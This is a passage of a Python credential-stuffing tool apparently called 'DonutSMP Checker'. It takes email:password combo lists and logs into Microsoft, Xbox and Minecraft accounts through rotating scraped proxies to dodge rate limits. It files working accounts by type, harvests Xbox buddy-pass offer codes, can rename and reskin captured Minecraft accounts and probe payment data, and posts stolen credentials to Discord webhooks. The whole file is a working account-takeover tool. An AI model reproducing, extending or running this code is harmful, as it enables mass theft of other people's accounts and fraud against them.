                    "Authorization": f"XBL3.0 x={uhss};{xsts_token}",
                    "Ms-Cv": "OgMi8P4bcc7vra2wAjJZ/O.19",
                    "Origin": "https://www.xbox.com",
                    "Priority": "u=1, i",
                    "Referer": "https://www.xbox.com/",
                    "Sec-Ch-Ua": '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "cross-site",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
                    "X-Ms-Api-Version": "1.0"
                }
                while True:
                    try:
                        r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers)
                        break
                    except:
                        retries+=1
                        session.proxy = getproxy()
                        if len(proxylist) == 0: time.sleep(20)
                        continue
                if 'offerid' in r.text.lower():
                        offers = r.json()["offers"]
                        current_time = datetime.now(timezone.utc)
                        valid_offer_ids = [offer["offerId"] for offer in offers 
                        if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                        with open(f"results/{fname}/Codes.txt", 'a') as f:
                            for offer in valid_offer_ids:
                                f.write(f"{offer}\n")
                        for offer in offers: codes.append(offer['offerId'])
                        if len(offers) < 5:
                            while True:
                                try:
                                    r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                                    if 'offerId' in r.text:
                                        offers = r.json()["offers"]
                                        current_time = datetime.now(timezone.utc)
                                        valid_offer_ids = [offer["offerId"] for offer in offers 
                                        if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                        with open(f"results/{fname}/Codes.txt", 'a') as f:
                                            for offer in valid_offer_ids:
                                                f.write(f"{offer}\n")
                                        shouldContinue = False
                                        for offer in offers:
                                            if offer['offerId'] not in codes: shouldContinue = True
                                        for offer in offers: codes.append(offer['offerId'])
                                        if shouldContinue == False: break
                                    else: break
                                except:
                                    retries+=1
                                    session.proxy = getproxy()
                                    if len(proxylist) == 0: time.sleep(20)
                                    continue
                else:
                    while True:
                        try:
                            r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                            if 'offerId' in r.text:
                                offers = r.json()["offers"]
                                current_time = datetime.now(timezone.utc)
                                valid_offer_ids = [offer["offerId"] for offer in offers 
                                if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                with open(f"results/{fname}/Codes.txt", 'a') as f:
                                    for offer in valid_offer_ids:
                                        f.write(f"{offer}\n")
                                shouldContinue = False
                                for offer in offers:
                                    if offer['offerId'] not in codes: shouldContinue = True
                                for offer in offers: codes.append(offer['offerId'])
                                if shouldContinue == False: break
                            else: break
                        except:
                            retries+=1
                            session.proxy = getproxy()
                            if len(proxylist) == 0: time.sleep(20)
                            continue
            except: pass
            capture_mc(token, session, email, password, acctype)
            try:
                send_xbox_webhook(email, password, acctype)
            except: pass
            return True
        elif acctype == "Xbox Game Pass (PC)" or acctype == "Normal Minecraft (with Game Pass)":
            xgp+=1
            cpm+=1
            checked+=1
            codes = []
            with open(f"results/{fname}/XboxGamePass.txt", 'a') as f: f.write(f"{email}:{password}\n")
            if "Normal" in acctype:
                with open(f"results/{fname}/Normal.txt", 'a') as f: f.write(f"{email}:{password}\n")
            try:
                while True:
                    try:
                        xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "http://mp.microsoft.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                        break
                    except:
                        retries+=1
                        session.proxy = getproxy()
                        if len(proxylist) == 0: time.sleep(20)
                        continue
                js = xsts.json()
                uhss = js['DisplayClaims']['xui'][0]['uhs']
                xsts_token = js.get('Token')
                headers = {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate, br, zstd",
                    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
                    "Authorization": f"XBL3.0 x={uhss};{xsts_token}",
                    "Ms-Cv": "OgMi8P4bcc7vra2wAjJZ/O.19",
                    "Origin": "https://www.xbox.com",
                    "Priority": "u=1, i",
                    "Referer": "https://www.xbox.com/",
                    "Sec-Ch-Ua": '"Opera GX";v="111", "Chromium";v="125", "Not.A/Brand";v="24"',
                    "Sec-Ch-Ua-Mobile": "?0",
                    "Sec-Ch-Ua-Platform": '"Windows"',
                    "Sec-Fetch-Dest": "empty",
                    "Sec-Fetch-Mode": "cors",
                    "Sec-Fetch-Site": "cross-site",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OPR/111.0.0.0",
                    "X-Ms-Api-Version": "1.0"
                }
                while True:
                    try:
                        r = session.get('https://emerald.xboxservices.com/xboxcomfd/buddypass/Offers', headers=headers)
                        break
                    except:
                        retries+=1
                        session.proxy = getproxy()
                        if len(proxylist) == 0: time.sleep(20)
                        continue
                if 'offerid' in r.text.lower():
                        offers = r.json()["offers"]
                        current_time = datetime.now(timezone.utc)
                        valid_offer_ids = [offer["offerId"] for offer in offers 
                        if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                        with open(f"results/{fname}/Codes.txt", 'a') as f:
                            for offer in valid_offer_ids:
                                f.write(f"{offer}\n")
                        for offer in offers: codes.append(offer['offerId'])
                        if len(offers) < 5:
                            while True:
                                try:
                                    r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                                    if 'offerId' in r.text:
                                        offers = r.json()["offers"]
                                        current_time = datetime.now(timezone.utc)
                                        valid_offer_ids = [offer["offerId"] for offer in offers 
                                        if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                        with open(f"results/{fname}/Codes.txt", 'a') as f:
                                            for offer in valid_offer_ids:
                                                f.write(f"{offer}\n")
                                        shouldContinue = False
                                        for offer in offers:
                                            if offer['offerId'] not in codes: shouldContinue = True
                                        for offer in offers: codes.append(offer['offerId'])
                                        if shouldContinue == False: break
                                    else: break
                                except:
                                    retries+=1
                                    session.proxy = getproxy()
                                    if len(proxylist) == 0: time.sleep(20)
                                    continue
                else:
                    while True:
                        try:
                            r = session.post('https://emerald.xboxservices.com/xboxcomfd/buddypass/GenerateOffer?market=GB', headers=headers)
                            if 'offerId' in r.text:
                                offers = r.json()["offers"]
                                current_time = datetime.now(timezone.utc)
                                valid_offer_ids = [offer["offerId"] for offer in offers 
                                if not offer["claimed"] and offer["offerId"] not in codes and datetime.fromisoformat(offer["expiration"].replace('Z', '+00:00')) > current_time]
                                with open(f"results/{fname}/Codes.txt", 'a') as f:
                                    for offer in valid_offer_ids:
                                        f.write(f"{offer}\n")
                                shouldContinue = False
                                for offer in offers:
                                    if offer['offerId'] not in codes: shouldContinue = True
                                for offer in offers: codes.append(offer['offerId'])
                                if shouldContinue == False: break
                            else: break
                        except:
                            retries+=1
                            session.proxy = getproxy()
                            if len(proxylist) == 0: time.sleep(20)
                            continue
            except: pass
            capture_mc(token, session, email, password, acctype)
            try:
                send_xbox_webhook(email, password, acctype)
            except: pass
            return True
        elif acctype == "Normal Minecraft":
            checked+=1
            cpm+=1
            with open(f"results/{fname}/Normal.txt", 'a') as f: f.write(f"{email}:{password}\n")
            capture_mc(token, session, email, password, acctype)
            return True
        else:
            others = []
            if 'product_minecraft_bedrock' in checkrq.text:
                others.append("Minecraft Bedrock")
            if 'product_legends' in checkrq.text:
                others.append("Minecraft Legends")
            if 'product_dungeons' in checkrq.text:
                others.append('Minecraft Dungeons')
            if others != []:
                other+=1
                cpm+=1
                checked+=1
                items = ', '.join(others)
                open(f"results/{fname}/Other.txt", 'a').write(f"{email}:{password} | {items}\n")
                if screen == "'2'": print(Fore.YELLOW+f"Other: {email}:{password} | {items}")
                send_other_webhook(email, password, items)
                return True
            else:
                return False
    else:
        return False

def mc_token(session, uhs, xsts_token):
    global retries
    while True:
        try:
            mc_login = session.post('https://api.minecraftservices.com/authentication/login_with_xbox', json={'identityToken': f"XBL3.0 x={uhs};{xsts_token}"}, headers={'Content-Type': 'application/json'}, timeout=15)
            if mc_login.status_code == 429:
                session.proxy = getproxy()
                if len(proxylist) == 0: time.sleep(20)
                continue
            else:
                return mc_login.json().get('access_token')
        except:
            retries+=1
            session.proxy = getproxy()
            continue

def authenticate(email, password, tries = 0):
    global retries, bad, checked, cpm
    try:
        session = requests.Session()
        session.verify = False
        session.proxies = getproxy()
        urlPost, sFTTag, session = get_urlPost_sFTTag(session)
        token, session = get_xbox_rps(session, email, password, urlPost, sFTTag)
        if token != "None":
            hit = False
            try:
                xbox_login = session.post('https://user.auth.xboxlive.com/user/authenticate', json={"Properties": {"AuthMethod": "RPS", "SiteName": "user.auth.xboxlive.com", "RpsTicket": token}, "RelyingParty": "http://auth.xboxlive.com", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                js = xbox_login.json()
                xbox_token = js.get('Token')
                if xbox_token != None:
                    uhs = js['DisplayClaims']['xui'][0]['uhs']
                    xsts = session.post('https://xsts.auth.xboxlive.com/xsts/authorize', json={"Properties": {"SandboxId": "RETAIL", "UserTokens": [xbox_token]}, "RelyingParty": "rp://api.minecraftservices.com/", "TokenType": "JWT"}, headers={'Content-Type': 'application/json', 'Accept': 'application/json'}, timeout=15)
                    js = xsts.json()
                    xsts_token = js.get('Token')
                    if xsts_token != None:
                        access_token = mc_token(session, uhs, xsts_token)
                        if access_token != None:
                            hit = checkmc(session, email, password, access_token, xbox_token)
            except: pass
            if hit == False: validmail(email, password)
            if config.get('payment') is True: payment(session, email, password)
    except:
        if tries < maxretries:
            tries+=1
            retries+=1
            authenticate(email, password, tries)
        else:
            bad+=1
            checked+=1
            cpm+=1
            if screen == "'2'": print(Fore.RED+f"Bad: {email}:{password}")
    finally:
        session.close()

def Load():
    global Combos, fname
    filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if filename is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Load()
    else:
        fname = os.path.splitext(os.path.basename(filename.name))[0]
        try:
            with open(filename.name, 'r+', encoding='utf-8') as e:
                lines = e.readlines()
                Combos = list(set(lines))
                print(Fore.LIGHTBLUE_EX+f"[{str(len(lines) - len(Combos))}] Dupes Removed.")
                print(Fore.LIGHTBLUE_EX+f"[{len(Combos)}] Combos Loaded.")
        except:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Load()

def Proxys():
    global proxylist
    fileNameProxy = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
    if fileNameProxy is None:
        print(Fore.LIGHTRED_EX+"Invalid File.")
        time.sleep(2)
        Proxys()
    else:
        try:
            with open(fileNameProxy.name, 'r+', encoding='utf-8', errors='ignore') as e:
                ext = e.readlines()
                for line in ext:
                    try:
                        proxyline = line.split()[0].replace('\n', '')
                        proxylist.append(proxyline)
                    except: pass
            print(Fore.LIGHTBLUE_EX+f"Loaded [{len(proxylist)}] lines.")
            time.sleep(2)
        except Exception:
            print(Fore.LIGHTRED_EX+"Your file is probably harmed.")
            time.sleep(2)
            Proxys()

def logscreen():
    global cpm, cpm1
    cmp1 = cpm
    cpm = 0
    utils.set_title(f"DonutSMP Checker | Checked: {checked}/{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=logscreen).start()    

def cuiscreen():
    global cpm, cpm1
    os.system('cls')
    cmp1 = cpm
    cpm = 0
    print(logo)
    print(f" [{checked}/{len(Combos)}] Checked")
    print(f" [{hits}] Hits")
    print(f" [{bad}] Bad")
    print(f" [{sfa}] SFA")
    print(f" [{mfa}] MFA")
    print(f" [{twofa}] 2FA")
    print(f" [{xgp}] Xbox Game Pass")
    print(f" [{xgpu}] Xbox Game Pass Ultimate")
    print(f" [{other}] Other")
    print(f" [{vm}] Valid Mail")
    print(f" [{retries}] Retries")
    print(f" [{errors}] Errors")
    utils.set_title(f"DonutSMP Checker | Checked: {checked}/{len(Combos)}  -  Hits: {hits}  -  Bad: {bad}  -  2FA: {twofa}  -  SFA: {sfa}  -  MFA: {mfa}  -  Xbox Game Pass: {xgp}  -  Xbox Game Pass Ultimate: {xgpu}  -  Valid Mail: {vm}  -  Other: {other}  -  Cpm: {cmp1*60}  -  Retries: {retries}  -  Errors: {errors}")
    time.sleep(1)
    threading.Thread(target=cuiscreen).start()

def finishedscreen():
    #os.system('cls')
    print(logo)
    print()
    print(Fore.LIGHTGREEN_EX+"Finished Checking!")
    print()
    print("Hits: "+str(hits))
    print("Bad: "+str(bad))
    print("SFA: "+str(sfa))
    print("MFA: "+str(mfa))
    print("2FA: "+str(twofa))
    print("Xbox Game Pass: "+str(xgp))
    print("Xbox Game Pass Ultimate: "+str(xgpu))
    print("Other: "+str(other))
    print("Valid Mail: "+str(vm))
    print(Fore.LIGHTRED_EX+"Press any key to exit.")
    repr(readchar.readkey())
    os.abort()

def getproxy():
    if proxytype == "'5'": return random.choice(proxylist)
    if proxytype != "'4'": 
        proxy = random.choice(proxylist)
        if proxytype  == "'1'": return {'http': 'http://'+proxy, 'https': 'http://'+proxy}
        elif proxytype  == "'2'": return {'http': 'socks4://'+proxy,'https': 'socks4://'+proxy}
        elif proxytype  == "'3'": return {'http': 'socks5://'+proxy,'https': 'socks5://'+proxy}
    else: return None

def Checker(combo):
    global bad, checked, cpm
    try:
        split = combo.strip().split(":")
        email = split[0]
        password = split[1]
        if email != "" and password != "":
            authenticate(str(email), str(password))
        else:
            if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
            bad+=1
            cpm+=1
            checked+=1
    except:
        if screen == "'2'": print(Fore.RED+f"Bad: {combo.strip()}")
        bad+=1
        cpm+=1
        checked+=1

def loadconfig():
    global maxretries, config

    def str_to_bool(value):
        return value.lower() in ('yes', 'true', 't', '1')

    default_config = {
        'Settings': {
            'Webhook': 'paste your discord webhook here',
            'Hits Webhook': 'paste your hits webhook here',
            '2FA Webhook': 'paste your 2fa webhook here',
            'Xbox Webhook': 'paste your xbox webhook here',
            'Other Webhook': 'paste your other webhook here',
            'DonutSMP API Key': 'paste your donutsmp api key here',
            'Email Check URL': 'paste your email check api url here (optional, leave as is if you don\'t have one)',
            'Embed': True,
            'Max Retries': 5,
            'WebhookMessage': '''@everyone HIT: ||`<email>:<password>`||
Name: <name>
Account Type: <type>
Money: <money>
Kills: <kills>
Deaths: <deaths>
Mobs Killed: <mobskilled>
Playtime: <playtime>
Shards: <shards>
Broken Blocks: <brokenblocks>
Placed Blocks: <placedblocks>
Money Made From Sell: <moneymadefromsell>
Money Spent On Shop: <moneyspentonshop>
Optifine Cape: <ofcape>
MC Capes: <capes>
Email Access: <access>
Can Change Name: <namechange>
Last Name Change: <lastchanged>'''
        },
        'Scraper': {
            'Auto Scrape Minutes': 5
        },
        'Auto': {
            'Set Name': True,
            'Name': 'msmc',
            'Set Skin': True,
            'Skin': 'https://s.namemc.com/i/bc8429d1f2e15539.png',
            'Skin Variant': 'classic'
        },
        'Captures': {
            'DonutSMP Money': True,
            'DonutSMP Kills': True,
            'DonutSMP Deaths': True,
            'DonutSMP Mobs Killed': True,
            'DonutSMP Playtime': True,
            'DonutSMP Shards': True,
            'DonutSMP Broken Blocks': True,
            'DonutSMP Placed Blocks': True,
            'DonutSMP Money Made From Sell': True,
            'DonutSMP Money Spent On Shop': True,
            'Optifine Cape': True,
            'Minecraft Capes': True,
            'Email Access': True,
            'Name Change Availability': True,
            'Last Name Change': True,
            'Payment': True
        }
    }
    if not os.path.isfile("config.ini"):
        c = configparser.ConfigParser(allow_no_value=True)
        for section, values in default_config.items():
            c[section] = values
        with open('config.ini', 'w') as configfile:
            c.write(configfile)
    read_config = configparser.ConfigParser()
    read_config.read('config.ini')
    config_updated = False
    for section, values in default_config.items():
        if section not in read_config:
            read_config[section] = values
            config_updated = True
        else:
            for key, value in values.items():
                if key not in read_config[section]:
                    read_config[section][key] = str(value)
                    config_updated = True
    if config_updated:
        with open('config.ini', 'w') as configfile:
            read_config.write(configfile)
    # settings
    maxretries = int(read_config['Settings']['Max Retries'])
    config.set('webhook', str(read_config['Settings']['Webhook']))
    config.set('hits_webhook', str(read_config['Settings'].get('Hits Webhook', 'paste your hits webhook here')))
    config.set('2fa_webhook', str(read_config['Settings'].get('2FA Webhook', 'paste your 2fa webhook here')))
    config.set('xbox_webhook', str(read_config['Settings'].get('Xbox Webhook', 'paste your xbox webhook here')))
    config.set('other_webhook', str(read_config['Settings'].get('Other Webhook', 'paste your other webhook here')))
    config.set('donutsmp_api_key', str(read_config['Settings'].get('DonutSMP API Key', 'paste your donutsmp api key here')))
    config.set('email_check_url', str(read_config['Settings'].get('Email Check URL', 'paste your email check api url here (optional, leave as is if you don\'t have one)')))
    config.set('embed', str_to_bool(read_config['Settings']['Embed']))
    config.set('message', str(read_config['Settings']['WebhookMessage']))
    # scraper
    config.set('autoscrape', int(read_config['Scraper']['Auto Scrape Minutes']))
    # auto
    config.set('setname', str_to_bool(read_config['Auto']['Set Name']))
    config.set('name', str(read_config['Auto']['Name']))
    config.set('setskin', str_to_bool(read_config['Auto']['Set Skin']))
    config.set('skin', str(read_config['Auto']['Skin']))
    config.set('variant', str(read_config['Auto']['Skin Variant']))
    # capture
    config.set('donutsmpmoney', True)
    config.set('donutsmpkills', True)
    config.set('donutsmpdeaths', True)
    config.set('donutsmpmobskilled', True)
    config.set('donutsmpplaytime', True)
    config.set('donutsmpshards', True)
    config.set('donutsmpbrokenblocks', True)
    config.set('donutsmpplacedblocks', True)
    config.set('donutsmpsellmoney', True)
    config.set('donutsmp shopmoney', True)
    config.set('optifinecape', str_to_bool(read_config['Captures']['Optifine Cape']))
    config.set('mcapes', str_to_bool(read_config['Captures']['Minecraft Capes']))
    config.set('access', str_to_bool(read_config['Captures']['Email Access']))
    config.set('namechange', str_to_bool(read_config['Captures']['Name Change Availability']))
    config.set('lastchanged', str_to_bool(read_config['Captures']['Last Name Change']))
    config.set('payment', str_to_bool(read_config['Captures']['Payment']))

def get_proxies():
    global proxylist
    http = []
    socks4 = []
    socks5 = []
    api_http = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=http&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/http.txt" #JUST SO YOU KNOW YOU CANNOT PUT ANY PAGE WITH PROXIES HERE UNLESS ITS JUST PROXIES ON THE PAGE, TO SEE WHAT I MEAN VISIT THE WEBSITES
    ]
    api_socks4 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks4&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks4.txt" #JUST SO YOU KNOW YOU CANNOT PUT ANY PAGE WITH PROXIES HERE UNLESS ITS JUST PROXIES ON THE PAGE, TO SEE WHAT I MEAN VISIT THE WEBSITES
    ]
    api_socks5 = [
        "https://api.proxyscrape.com/v3/free-proxy-list/get?request=getproxies&protocol=socks5&timeout=15000&proxy_format=ipport&format=text",
        "https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
        "https://raw.githubusercontent.com/prxchk/proxy-list/main/socks5.txt" #JUST SO YOU KNOW YOU CANNOT PUT ANY PAGE WITH PROXIES HERE UNLESS ITS JUST PROXIES ON THE PAGE, TO SEE WHAT I MEAN VISIT THE WEBSITES
    ]
    for service in api_http:
        http.extend(requests.get(service).text.splitlines())
    for service in api_socks4: 
        socks4.extend(requests.get(service).text.splitlines())
    for service in api_socks5: 
        socks5.extend(requests.get(service).text.splitlines())
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks4&limit=500").json().get('data'):
            socks4.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    try:
        for dta in requests.get("https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500").json().get('data'):
            socks5.append(f"{dta.get('ip')}:{dta.get('port')}")
    except: pass
    http = list(set(http))
    socks4 = list(set(socks4))
    socks5 = list(set(socks5))
    proxylist.clear()
    for proxy in http: proxylist.append({'http': 'http://'+proxy, 'https': 'http://'+proxy})
    for proxy in socks4: proxylist.append({'http': 'socks4://'+proxy,'https': 'socks4://'+proxy})
    for proxy in socks5: proxylist.append({'http': 'socks5://'+proxy,'https': 'socks5://'+proxy})
    if screen == "'2'": print(Fore.LIGHTBLUE_EX+f'Scraped [{len(proxylist)}] proxies')
    time.sleep(config.get('autoscrape') * 60)
    get_proxies()


def Main():
    global proxytype, screen
    utils.set_title("DonutSMP Checker")
    os.system('cls')
    try:
        loadconfig()
    except Exception as e:
        print(e)
        traceback.print_exc()
        line_number = traceback.extract_tb(e.__traceback__)[-1].lineno
        print("Exception occurred at line:", line_number)
        print(Fore.RED+"There was an error loading the config. Perhaps you're using an older config? If so please delete the old config and reopen the checker.")
        input()
        exit()
    print(logo)
    try:
        print(Fore.LIGHTBLACK_EX+"(speed for checking, i recommend 100, give more threads if its slow. if proxyless give at most 5 threads.)")
        thread = int(input(Fore.LIGHTBLUE_EX+"Threads: "))
    except:
        print(Fore.LIGHTRED_EX+"Must be a number.") 
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX+"Proxy Type: [1] Http/s - [2] Socks4 - [3] Socks5 - [4] None - [5] Auto Scraper")
    proxytype = repr(readchar.readkey())
    cleaned = int(proxytype.replace("'", ""))
    if cleaned not in range(1, 6):
        print(Fore.RED+f"Invalid Proxy Type [{cleaned}]")
        time.sleep(2)
        Main()
    print(Fore.LIGHTBLUE_EX+"Screen: [1] CUI - [2] Log")
    screen = repr(readchar.readkey())
    print(Fore.LIGHTBLUE_EX+"Select your combos")
    Load()
    if proxytype != "'4'" and proxytype != "'5'":
        print(Fore.LIGHTBLUE_EX+"Select your proxies")
        Proxys()
    if proxytype =="'5'":
        print(Fore.LIGHTGREEN_EX+"Scraping Proxies Please Wait.")
        threading.Thread(target=get_proxies).start()
        while len(proxylist) == 0: 
            time.sleep(1)
    if not os.path.exists("results"): os.makedirs("results/")
    if not os.path.exists('results/'+fname): os.makedirs('results/'+fname)
    if screen == "'1'": cuiscreen()
    elif screen == "'2'": logscreen()
    else: cuiscreen()
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread) as executor:
        futures = [executor.submit(Checker, combo) for combo in Combos]
        concurrent.futures.wait(futures)
    finishedscreen()
    input()
Main()